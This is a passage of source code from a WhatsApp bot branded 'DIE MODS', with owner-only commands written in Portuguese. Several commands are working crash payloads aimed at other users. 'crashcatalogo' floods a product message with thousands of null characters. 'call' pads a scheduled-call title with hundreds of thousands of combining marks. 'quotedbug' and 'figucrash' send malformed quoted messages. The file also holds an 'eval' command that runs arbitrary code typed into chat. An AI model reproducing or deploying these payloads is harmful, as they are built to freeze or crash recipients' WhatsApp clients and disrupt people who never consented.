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","itemCount":-9999,"status":"INQUIRY","surface":"CATALOG","message":"","orderTitle":"Scrr","sellerJid":"558398042937@s.whatsapp.net","token":"AR5NOhya+2v8n0fhYRJr/ensnmtWgeY0XQwCVX1Q4hx0NQ==","totalAmount1000":"1000","totalCurrencyCode":"BRL"}});break

case '𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ctt': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"contactMessage":{"displayName":"𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ","vcard":"BEGIN:VCARD\nVERSION:3.0\nN:KALZIN;KALZIN;KALZIN;;\nFN:𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  \nORG:\nTITLE:Nada Prequissoso\nitem1.TEL;waid=558398140301:+55 83 9814-0301\nitem1.X-ABLabel:Celular\nEND:VCARD"}});break

case 'figudogato': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"stickerMessage":{"url":"https://mmg.whatsapp.net/v/t62.15575-24/29882793_1026439328367332_3911294454151947079_n.enc?ccb=11-4&oh=01_AdR8ORx8mF5nSTjWy0idu4iEs-nlgf0u305f8nwmvnbdHg&oe=6508369A&mms3=true","fileSha256":"JdheQfSl7n5GPN0zdiPKQyz08F9vSg1h3EXzo4NCnGE=","fileEncSha256":"Lp6BsKi+ZGlP24gM8z6uNceaoU4sc+pPge2qII5IufA=","mediaKey":"ANZVMjeaLz2Q2by/Wfd9pAZ6K6yqaWvssS6BVNSMf+s=","mimetype":"image/webp","height":64,"width":64,"directPath":"/v/t62.15575-24/29882793_1026439328367332_3911294454151947079_n.enc?ccb=11-4&oh=01_AdR8ORx8mF5nSTjWy0idu4iEs-nlgf0u305f8nwmvnbdHg&oe=6508369A","fileLength":"150098","mediaKeyTimestamp":"1692404160","firstFrameLength":4386,"firstFrameSidecar":"s9vuaVEULFPldg==","isAnimated":true,"stickerSentTs":"1692447699000","isAvatar":false}});break

case 'audiododroid': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"audioMessage":{"url":"https://mmg.whatsapp.net/v/t62.7117-24/25352924_3536073899999571_8088095286439065133_n.enc?ccb=11-4&oh=01_AdQrKQZXW4TJYpj1K_yVl9h82ZiypVpMqNmi7b7ucksXjQ&oe=650791A6&mms3=true","mimetype":"audio/ogg; codecs=opus","fileSha256":"Y6GWSlIyob/sJR3lemznwMVdaBJqtz7gVi2t4L8+YyY=","fileLength":"36202","seconds":15,"ptt":false,"mediaKey":"p8ctSTcqF7m77ofsNZV1o1KsSCRvbH2M0OzYOBSE0Qg=","fileEncSha256":"Q++9WvVbKClr3sJHEekyD5UFvxNPnNVMx9oSJxkBmI0=","directPath":"/v/t62.7117-24/25352924_3536073899999571_8088095286439065133_n.enc?ccb=11-4&oh=01_AdQrKQZXW4TJYpj1K_yVl9h82ZiypVpMqNmi7b7ucksXjQ&oe=650791A6&_nc_hot=1692409138","mediaKeyTimestamp":"1692409075","contextInfo":{"forwardingScore":1,"isForwarded":true},"waveform":"GRgvMkk6NTEDMQYUAAAYGjYiIDxCIgAAS0clExJMPDlAEjgxADsCJAcvIAIARC4FBAAAAAAhNQctODwAPRs9AA=="}});break








case 'teste': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"requestPaymentMessage":{"currencyCodeIso4217":"","amount1000":"0","requestFrom":"558398140301@s.whatsapp.net","noteMessage":{"extendedTextMessage":{"text":"\n\n APRECIE A BRISA \n\n"}},"expiryTimestamp":"0","amount":{"value":"0","offset":1000,"currencyCode":""}}});break
case 'roubar': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, null);break

case 'cttpdf': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"documentMessage":{"url":"https://mmg.whatsapp.net/v/t62.7119-24/33336630_6423820097665486_8861408341099436600_n.enc?ccb=11-4&oh=01_AdQTRCnaS6RnyyH7s5DWJILxDFA2PtKUWzFPKOTCQX8efA&oe=64FC8F83&mms3=true","mimetype":"text/vcard","title":"KILLA","fileSha256":"TVs4E4fsZCfcusPUmE2NzthQS378cytEh83/nX/Z2sY=","fileLength":"421122","pageCount":1,"mediaKey":"URmD8fG5TCQSC6FGmF3T8/fH6YKC90dC/69muUse9mM=","fileName":"KILLA","fileEncSha256":"AfzCSKjJZbm5Y5j7zQQd911L3Y5J//Gk0wxj2S98NIA=","directPath":"/v/t62.7119-24/33336630_6423820097665486_8861408341099436600_n.enc?ccb=11-4&oh=01_AdQTRCnaS6RnyyH7s5DWJILxDFA2PtKUWzFPKOTCQX8efA&oe=64FC8F83&_nc_hot=1691780311","mediaKeyTimestamp":"1691692467","contactVcard":true,"thumbnailDirectPath":"/v/t62.36145-24/32554052_1474240750054123_4297160805429374727_n.enc?ccb=11-4&oh=01_AdROlD2Ene1BC3zB9hykhcSC9Q7QoTXl0ydrXJt3PgnLgA&oe=64FCA4A1","thumbnailSha256":"z8MIN4NJgIhq5iB3RPXuz51eVTl7g3xk1aG/dDIsw7U=","thumbnailEncSha256":"ZQZq2srE4vVDdUlQUuRMqt7ebn2geE5k6i5PE+iid4A=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAtAAEAAwEBAQEAAAAAAAAAAAAAAgMFAQQGBwEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAA+HsjYdlZceaaw8tXs8xW4IuCXYiSIcDoP1tsjGbIxmyMZsjGbIAAAAAAAAAAAAAAA//EACYQAAECBQQBBQEAAAAAAAAAAAEAAgMFERZUEjFBUSEEEBMiMGD/2gAIAQEAAT8ABd2UNXZQa7srS7soNd2VpcRynMf2VR3ZVSOSmN5TXM5TYkLo0ovmgefqVFjNcG0G26b6iGNXjdtAnx4RNQDshEaB5HKJqT71VVVVVf0t+T4bFb8nw2K35PhsVvyfDYrfk+GxW/J8Nit+T4bFb8nw2K35Phs/gP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z","thumbnailHeight":480,"thumbnailWidth":339}});break
case 'mek2':
if(!isQuotedMsg){
if(args[0] === 'msg') {
mekemarquivo = `${JSON.stringify(info.message, null, 2)}
`
} else if(args[0] === 'all') {
mekemarquivo = `${JSON.stringify(info, null, 2)}`
} else {
mekemarquivo = `MEK ORIGINAL —> ${JSON.stringify(info, null, 2)}

MENSAGEM DO MEK —>  ${JSON.stringify(info.message, null, 2)}
`
}
fs.writeFileSync('./mek', mekemarquivo);
trix.sendMessage(from, { document: fs.readFileSync('./mek'), mimetype: 'text/plain', fileName: 'mek da mensagem aqui.json'})
fs.unlinkSync('./mek')
} else{
if(args[0] === 'msg') {
mekemarquivo = `
${JSON.stringify(info.message, null, 2)}
`
} else if (args[0] === 'quoted') {
mekemarquivo = `${JSON.stringify(info.message.extendedTextMessage.contextInfo.quotedMessage, null, 2)}
`
} else if(args[0] === 'contexto') {
mekemarquivo = `${JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 2)}`
} else if(args[0] === 'all') {
mekemarquivo = `${JSON.stringify(info, null, 2)}`
}else {
mekemarquivo = `MEK ORIGINAL —> ${JSON.stringify(info, null, 2)}

MENSAGEM DO MEK —>  ${JSON.stringify(info.message, null, 2)}

QUOTED DO MEK —>  ${JSON.stringify(info.message.extendedTextMessage.contextInfo.quotedMessage, null, 2)}

CONTEXTO COMPLETO DO MEK —>  ${JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 2)}
`}
fs.writeFileSync('./mek', mekemarquivo);
trix.sendMessage(from, { document: fs.readFileSync('./mek'), mimetype: 'text/plain', fileName: 'mek da mensagem aqui.json'})
fs.unlinkSync('./mek')
}

break;
case 'quotedbug':
for (let i = 0; i < 10; i++) {
 await delay(3000)
     if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
trix.sendjson(from,{"extendedTextMessage":{"text":"Kalzin and trix 👀","previewType":"NONE","contextInfo":{"stanzaId":"BAE5D9F972EE0F94", "fromMe": false,"participant":"5583927393@s.whatsapp.net",   "remoteJid": '1@s.whatsapp.net',"quotedMessage":{"paymentInviteMessage":{"serviceType":"UPI","expiryTimestamp":"999999999"}},"expiration":86400,"ephemeralSettingTimestamp":"1691674292","disappearingMode":{"initiator":"INITIATED_BY_OTHER"}},"inviteLinkGroupTypeV2":"DEFAULT"},"messageContextInfo":{"deviceListMetadata":{"recipientKeyHash":"rY6GqnspiT5iRg==","recipientTimestamp":"1692374324"},"deviceListMetadataVersion":2}})};
break

case 'crashcatalogo':
  let cu69 = " ~ ~ ~ 🦄 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   🌠 ~ ~ ~ ";
  for (let i = 0; i < 5500; i++) {
    cu69 += "\u0000\u0000\u0000\u0000\u0000";
  }
  if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");
  trix.sendjson(from, {
    "productMessage": {
      "product": {
        "productImage": {
          "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m236/up-oil-image-6aec6184-b33b-46d1-afab-3986c439ab3a?ccb=9-4&oh=01_AdTJoInJ_6gTPLV7o5VnB5iTXZ7H0XMcvJfGl0Iw6NQvHQ&oe=64FDC57A",
          "mimetype": "image/jpeg",
          "fileSha256": "ltrDnCHagIq7P5Y3dmqEB5uF2NtlmFdSbKHIGk2YWNs=",
          "fileLength": "20115",
          "height": 375,
          "width": 462,
          "mediaKey": "Znedw275Dnfud0QUY3zBBFpfXFs2BiiHSuJnVMsCc28=",
          "fileEncSha256": "b6LPLzH6yIMUjEz/zKSnrJdOWMa4TX6BaBB7h8DAmco=",
          "directPath": "/o1/v/t62.7118-24/f1/m236/up-oil-image-6aec6184-b33b-46d1-afab-3986c439ab3a?ccb=9-4&oh=01_AdTJoInJ_6gTPLV7o5VnB5iTXZ7H0XMcvJfGl0Iw6NQvHQ&oe=64FDC57A",
          "mediaKeyTimestamp": "1691767256",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADoASAMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMzpHljK7GnUoZ3qfLTYQEkAAFugnvsR50G9jx3OvkZYA0bi0ZsSc2Gu82rZ0fPbBlYwGXYVhe9lNHVM0FrSEjRQH//EACgQAAICAgECBgEFAAAAAAAAAAECAAMEESESIAUTFDFBUhAiMjM0cf/aAAgBAQABPwDHwhZy7iW+HdLaFqx8C9BviV02WWBAOZk+HW49Qs3sdtVxrbfvHussbqZuZRlMGCueIClRFkyb1uw3VR3pU7glRvULlsRQRypmM/lIWI95fjpcvVWNNGUqSCO3He1LAUgrW4D4eDEJ4YgSrHoq+dzxZKhaCnZXQjoGL62YFatdBhES4sN28RqOnk2mAAAAWczMxVtTq3+oQ8H8UUecDPSkAjr5hxLgOXmIjmre5Ybmdk6tERsawaPWZQ1jjpJmbhBVV0/C2On7TqebZ9p6i77meHXHr6CZlWt6iwg/M9Rb9zFtsX2aUZRbddzEoZlY3kEEHat7dmH/AGEmT/PZ/vYzsUUEkgT/xAAYEQEAAwAAAAAAAAAAAAAAAAABABEgIf/aAAgBAgEBPwCVy9CVgix3/8QAGxEBAAIDAQEAAAAAAAAAAAAAAQACESAhEBL/2gAIAQMBAT8An0lsJqxLtsjD26hyFF6srk47/wD/2Q==",
          "scansSidecar": "XY4QoDNypIrfAQLaqFEnDBF1+88SfYAIoGRSVAFfL9EM26wLPCq9nw==",
          "scanLengths": [2075, 7441, 4461, 6138],
          "midQualityFileSha256": "3XU/raBis7WcB/vQfixIW1vF3rPYYeSjAKsClNKB/KE="
        },
        "title": cu69,
        "description": cu69,
        "currencyCode": "BRL",
        "priceAmount1000": "9999",
        "productImageCount": 999,
      },
      "businessOwnerJid": "558398042937@s.whatsapp.net"
    }
  }, {quoted: crash});
  await delay(2000);
  trix.sendjson(from, {
    "extendedTextMessage": {
      "text": "😈 ✦ ꪶ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   ⸸ ꫂ ✦ 🕺"
    }
  },{quoted: cr});
  break;
  
case 'eval':
if (!isOwner && !info.key.fromMe) return enviar("So meu dono ©️ ")
    try {
     eval(`(async () => {
      try {
      await enviar('× [ Eval ] Comando executado!');
      ${budy.slice(5)}
      } catch(err) {
      console.error("[ Error ] ", JSON.stringify(err, null, 2));
      enviar(util.inspect(err));
      }
      })();`);
    } catch(err) {
     enviar(util.inspect(err));
     console.error("[ Error ] ", JSON.stringify(err, null, 2));
    }
    break;
    
    case 'info':
    if (!isOwner && !info.key.fromMe) return enviar("So meu dono ©️ ")
          const infogetclone2 = isQuotedMsg ? info.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage: info.message.extendedTextMessage.contextInfo.quotedMessage
  enviar('#eval trix.sendjson(from,' + JSON.stringify(infogetclone2)+')' + `\n\n//By kalzin OwO`);
break;break;
case 'linkcall': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"extendedTextMessage":{"text":"https://call.whatsapp.com/video/KALZINANDTRIX","matchedText":"https://call.whatsapp.com/video/KALZINANDTRIX","description":"🚀 ~ ~ ~ Kalzin and trix ~ ~ ~ ☠️","title":"🥥 ~ ~  ~ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞x x  ~ ~ ~ 🌌 ","previewType":"NONE","inviteLinkGroupTypeV2":"DEFAULT"}});break

case 'figucrash':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); trix.sendjson(from, {"stickerMessage":{"url":"https://mmg.whatsapp.net/v/t62.15575-24/19168581_1608131233045977_2253911423308370047_n.enc?ccb=11-4&oh=01_AdTkXSm6IO-6DF5fjbkW1ZjlDJFQXWKqSBbxvjn1JImWaA&oe=64FB21C9&mms3=true","fileSha256":"Ro/AQBIqbSmsU0ksef7UUS1hW7UnlXMD5o29FdA4A1U=","fileEncSha256":"9QR2L1J0BJ1ofJXaeYprQwxO/a2Vog3LaUg+ylo6rEI=","mediaKey":"8PFhpK8k4N7lrEynEAfzV8ShAHnJR9Ya4T33/f4BYzk=","mimetype":"image/webp","height":64,"width":64,"directPath":"/v/t62.15575-24/19168581_1608131233045977_2253911423308370047_n.enc?ccb=11-4&oh=01_AdTkXSm6IO-6DF5fjbkW1ZjlDJFQXWKqSBbxvjn1JImWaA&oe=64FB21C9&_nc_hot=1691589337","fileLength":"13246","mediaKeyTimestamp":"1691538038","isAnimated":false,"stickerSentTs":"1691589337000","isAvatar":true}}, {quoted: crash});break

case 'reiniciar': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"conversation":"🤔👍"});break
//

case 'cudomhzin': if (!isOwner && !info.key.fromMe) return enviar("Só meu dono man");trix.sendjson(from, {"requestPaymentMessage":{"currencyCodeIso4217":"","amount1000":"0","requestFrom":"558398042937@s.whatsapp.net","noteMessage":{"extendedTextMessage":{"text":"\n\n APRECIE A BRISA \n\n"}},"expiryTimestamp":"0","amount":{"value":"0","offset":1000,"currencyCode":""}}});break
case 'call':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); {
let cu33 = "ᯭ ᯮ 𝐍𝟄𝝌⌰𝑺 Op 🐲 𝐛𝐲ꪶ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦   ⸸ ꫂ 👾 ";
for (let i = 0; i < 60009; i++) {
  cu33 += "ྀྀྀྀྀ";
}
cu33 += "";
  // Avisa Lá Que É O kalzin krl
  const x7 = await trix.sendjson(from, {
    "scheduledCallCreationMessage": {
      "scheduledTimestampMs": Date.now() + 60000 ,
      "callType": "VIDEO",
      "title": "KALZIN-CLIENT" + cu33,
      quoted: cart
    }
  });
  const omg7 = `${x7}`;
  await trix.sendjson(from, {
    "scheduledCallEditMessage": {
      "id": omg7
    }
  });
  break
  }
  case 'ativarnot':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
config.recebernotificacao = false
await fs.writeFileSync("./config.json", JSON.stringify(config, null, 2))
enviar(`\n\n Pronto agora você está recebendo notificação enquanto o bot estiver ligado \n\n`)
break
case 'desativarnot':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
config.recebernotificacao = true
await fs.writeFileSync("./config.json", JSON.stringify(config, null, 2))
enviar(`\n\n Pronto agora você Não irá receber notificação enquanto o bot estiver ligado \n\n`)
break
case 'setp':
if (!isOwner && !info.key.fromMe) return enviar("\n\nSó meu dono man\n\n"); 
const kauanefofo = args.join(' ')
config.prefix = kauanefofo
await fs.writeFileSync("./config.json", JSON.stringify(config, null, 2))
enviar(`\n\n prontinho Prefixo alterado Para ${kauanefofo} \n\n`)
break
  case 'ondeleteall':
  if (!isOwner && !info.key.fromMe) return enviar("Apenas o meu dono pode fazer isso.");
  config.funcaoapagar = true;
  await fs.writeFileSync("./config.json", JSON.stringify(config, null, 2));
